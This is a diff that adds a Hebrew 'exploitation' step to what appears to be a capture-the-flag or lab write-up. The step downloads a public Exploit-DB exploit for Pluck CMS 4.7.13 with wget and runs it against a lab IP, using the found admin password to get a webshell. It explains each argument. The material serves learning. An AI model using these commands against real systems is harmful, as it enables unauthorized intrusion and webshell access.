@@ -122,3 +122,34 @@ Password: password
 
 <img width="989" height="715" alt="image" src="https://github.com/user-attachments/assets/ab776bff-34cb-46bc-ab88-e40cb4db8c4b" />
 
+
+
+שלב 6 - שלב הפריצה (Exploitation). אחרי שמצאנו את דף הניהול וגילינו שהסיסמה היא password, אנחנו משתמשים ב-Exploit מוכן שכתוב בפייתון כדי להשיג גישה למערכת (Webshell).
+
+להלן הסבר על הפקודות ומה הן עושות:
+
+1. הורדת הקוד הזדוני (Exploit)
+Bash
+wget https://www.exploit-db.com/download/49909 -O exploit.py
+wget: פקודה להורדת קבצים מהאינטרנט.
+
+הקישור: מפנה למאגר Exploit-DB, שם נמצא קוד שמנצל פגיעות ספציפית בגרסה 4.7.13 של Pluck.
+
+exploit.py -O: דגל שאומר למחשב לשמור את הקובץ שהורד בשם exploit.py.
+
+2. הרצת ה-Exploit
+Bash
+python3 ./exploit.py 10.114.130.181 80 password /app/pluck-4.7.13
+כאן אתה מריץ את התוכנית ומזין לה "ארגומנטים" (נתונים) כדי שהיא תדע איפה לתקוף:
+
+python3: שימוש בשפת פייתון להרצת הקובץ.
+
+10.114.130.181: כתובת ה-IP של המטרה (Target).
+
+80: הפורט שבו רץ אתר האינטרנט.
+
+password: הסיסמה שמצאנו קודם ללוח הניהול (הסקריפט צריך להתחבר כדי להעלות קובץ).
+
+/app/pluck-4.7.13: הנתיב המדויק שבו מותקנת המערכת בשרת.
+
+<img width="984" height="805" alt="image" src="https://github.com/user-attachments/assets/1229dd4c-e0e0-4c43-8abc-efbe7a8a6364" />
